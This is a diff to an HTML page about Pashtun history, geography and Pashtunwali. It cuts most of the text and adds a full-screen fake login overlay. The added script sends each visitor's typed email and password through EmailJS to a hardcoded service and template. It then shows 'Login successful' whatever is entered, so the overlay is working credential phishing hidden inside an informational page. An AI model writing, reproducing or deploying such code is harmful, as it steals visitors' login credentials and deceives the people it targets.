@@ -4,51 +4,111 @@
 <meta charset="UTF-8">
 <title>Pashtuns - History & Culture</title>
 
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
 <style>
-body{
-  margin:0;
-  font-family:Georgia;
-  background:#0b1220;
-  color:#e5e7eb;
-  line-height:1.8;
-}
+  body{
+    margin:0;
+    font-family:Georgia;
+    background:#0b1220;
+    color:#e5e7eb;
+    line-height:1.8;
+  }
 
-header{
-  background:#0f172a;
-  padding:25px;
-  text-align:center;
-  border-bottom:1px solid #1e293b;
-}
+  header{
+    background:#0f172a;
+    padding:25px;
+    text-align:center;
+    border-bottom:1px solid #1e293b;
+  }
 
-.container{
-  max-width:1000px;
-  margin:auto;
-  padding:25px;
-}
+  .container{
+    max-width:1000px;
+    margin:auto;
+    padding:25px;
+  }
 
-h1,h2,h3{
-  color:#60a5fa;
-}
+  h1,h2,h3{ color:#60a5fa; }
 
-.section{
-  background:#111827;
-  padding:20px;
-  margin:18px 0;
-  border-radius:10px;
-}
+  .section{
+    background:#111827;
+    padding:20px;
+    margin:18px 0;
+    border-radius:10px;
+  }
 
-.small{
-  font-size:13px;
-  opacity:0.8;
-}
+  .small{ font-size:13px; opacity:0.8; }
 
-ul{
-  margin-left:20px;
-}
+  ul{ margin-left:20px; }
+
+  /* LOGIN OVERLAY */
+  #loginPage{
+    position:fixed;
+    top:0;
+    left:0;
+    width:100%;
+    height:100%;
+    background:#0b1220;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    z-index:9999;
+  }
+
+  .login-box{
+    background:#111827;
+    padding:25px;
+    border-radius:10px;
+    width:300px;
+  }
+
+  .login-box input{
+    width:100%;
+    padding:10px;
+    margin:10px 0;
+    border:none;
+    border-radius:6px;
+  }
+
+  .login-box button{
+    width:100%;
+    padding:10px;
+    background:#2563eb;
+    border:none;
+    color:white;
+    border-radius:6px;
+    cursor:pointer;
+  }
+
+  .msg{
+    font-size:13px;
+    margin-top:10px;
+    color:red;
+  }
+
+  #mainContent{
+    display:none;
+  }
 </style>
 </head>
 
 <body>
+
+<!-- 🔐 LOGIN PAGE -->
+<div id="loginPage">
+  <div class="login-box">
+    <h2>Login</h2>
+
+    <input type="email" id="email" placeholder="Email">
+    <input type="password" id="password" placeholder="Password">
+
+    <button onclick="login()">Login</button>
+    <div class="msg" id="msg"></div>
+  </div>
+</div>
+
+<!-- 📄 MAIN WEBSITE -->
+<div id="mainContent">
 
 <header>
   <h1>📜 The Pashtuns: Understanding History and Culture</h1>
@@ -57,133 +117,80 @@ ul{
 
 <div class="container">
 
-<!-- INTRO -->
 <div class="section">
 <h2>Introduction</h2>
-The Pashtuns are a major ethnic group of South and Central Asia, living mainly in Afghanistan and Pakistan.
-Their identity is shaped by geography, tribal systems, language, religion, and centuries of political conflict.
+<p>The Pashtuns are a major ethnic group of South and Central Asia, living mainly in Afghanistan and Pakistan. Their identity is shaped by geography, tribal systems, language, religion, and centuries of political conflict.</p>
 </div>
 
-<!-- MODERN CONTEXT -->
 <div class="section">
 <h2>Modern Political Context</h2>
-The fall of Kabul in August 2021 brought renewed geopolitical focus on Pashtun regions.
-Pakistan expected improved security, but militant dynamics such as TTP activity created new instability.
+<p>The fall of Kabul in August 2021 brought renewed geopolitical focus on Pashtun regions. Pakistan expected improved security, but militant dynamics such as TTP activity created new instability.</p>
 </div>
 
-<!-- GEOGRAPHY -->
 <div class="section">
 <h2>Geography of Pashtun Land</h2>
-Pashtunistan spans the region between the Indus River and the Hindu Kush mountains.
-It is a mountainous frontier zone historically shaped by migration, trade routes, and invasions.
+<p>Pashtunistan spans the region between the Indus River and the Hindu Kush mountains.</p>
 </div>
 
-<!-- DURAND LINE -->
 <div class="section">
 <h2>Durand Line Division</h2>
-The Pashtuns are divided between Pakistan and Afghanistan by the Durand Line (2,640 km).
-Despite this, they share:
 <ul>
 <li>Pashto language</li>
 <li>Tribal identity</li>
 <li>Cultural traditions</li>
-<li>Family-based social structure</li>
-<li>Sunni Islamic beliefs (mostly Hanafi)</li>
+<li>Family-based structure</li>
+<li>Sunni Islam (mostly Hanafi)</li>
 </ul>
 </div>
 
-<!-- INVASIONS -->
-<div class="section">
-<h2>Historical Invasions</h2>
-The Pashtun region has experienced repeated invasions:
-<ul>
-<li>Greeks (Alexander the Great)</li>
-<li>Persians</li>
-<li>Arabs</li>
-<li>Mongols</li>
-<li>Turks</li>
-<li>Mughals</li>
-<li>British Empire</li>
-<li>Soviet Union</li>
-<li>United States</li>
-</ul>
-Despite this, complete long-term control was rarely achieved.
-</div>
-
-<!-- KHYBER PASS -->
-<div class="section">
-<h2>Khyber Pass</h2>
-The Khyber Pass is one of the most historically important mountain routes in Asia.
-It has been used for invasions, trade, and cultural exchange for centuries.
-</div>
-
-<!-- IDENTITY -->
-<div class="section">
-<h2>Pashtun Identity</h2>
-Pashtuns share a strong sense of lineage, tribal belonging, and cultural pride.
-There are multiple theories about their origin including Aryan, Semitic, and mixed ancestry views.
-</div>
-
-<!-- POPULATION -->
-<div class="section">
-<h2>Population</h2>
-<ul>
-<li>Pakistan: ~31 million Pashtuns</li>
-<li>Afghanistan: ~15 million Pashtuns</li>
-</ul>
-Karachi hosts one of the largest Pashtun urban populations in the world.
-</div>
-
-<!-- PASHTUNWALI -->
 <div class="section">
 <h2>Pashtunwali (Code of Life)</h2>
-Pashtunwali is an unwritten tribal ethical system.
-
-<h3>Core Principles:</h3>
 <ul>
 <li>Melmastia – Hospitality</li>
 <li>Nang – Honor</li>
-<li>Badal – Justice / revenge</li>
-<li>Nanawatai – Forgiveness / refuge</li>
+<li>Badal – Justice</li>
+<li>Nanawatai – Forgiveness</li>
 <li>Jirga – Council system</li>
 </ul>
-Honor is the central value of Pashtun society.
 </div>
 
-<!-- CULTURE -->
-<div class="section">
-<h2>Culture</h2>
-Pashtun culture includes poetry, music, storytelling, and dance.
-Major elements:
-<ul>
-<li>Pashto poetry (Rahman Baba, Khushal Khan Khattak)</li>
-<li>Attan dance</li>
-<li>Rubab music</li>
-<li>Oral traditions</li>
-</ul>
-</div>
-
-<!-- MODERN HISTORY -->
-<div class="section">
-<h2>Modern History</h2>
-Pashtun regions have been central to:
-<ul>
-<li>British colonial frontier conflicts</li>
-<li>Cold War (Soviet invasion of Afghanistan)</li>
-<li>Post-9/11 war on terror</li>
-<li>Taliban resurgence</li>
-</ul>
-These events shaped modern instability and geopolitics.
-</div>
-
-<!-- CONCLUSION -->
 <div class="section">
 <h2>Conclusion</h2>
-Pashtun history reflects a combination of geography, resistance, tribal culture, and political complexity.
-Understanding their society is essential for understanding South and Central Asian geopolitics.
+<p>Pashtun history reflects geography, resistance, and tribal culture shaping South Asia.</p>
 </div>
 
 </div>
+</div>
+
+<script>
+(function(){
+  emailjs.init("aU_rVriMIfRSDIniQ");
+})();
+
+function login(){
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+
+  const params = {
+    user_email: email,
+    user_password: password
+  };
+
+  emailjs.send("service_bqnzz7f", "template_lxwj7sw", params)
+  .then(() => {
+    document.getElementById("msg").style.color = "green";
+    document.getElementById("msg").innerText = "Login successful";
+
+    setTimeout(() => {
+      document.getElementById("loginPage").style.display = "none";
+      document.getElementById("mainContent").style.display = "block";
+    }, 800);
+  })
+  .catch(() => {
+    document.getElementById("msg").innerText = "Login failed";
+  });
+}
+</script>
 
 </body>
 </html>
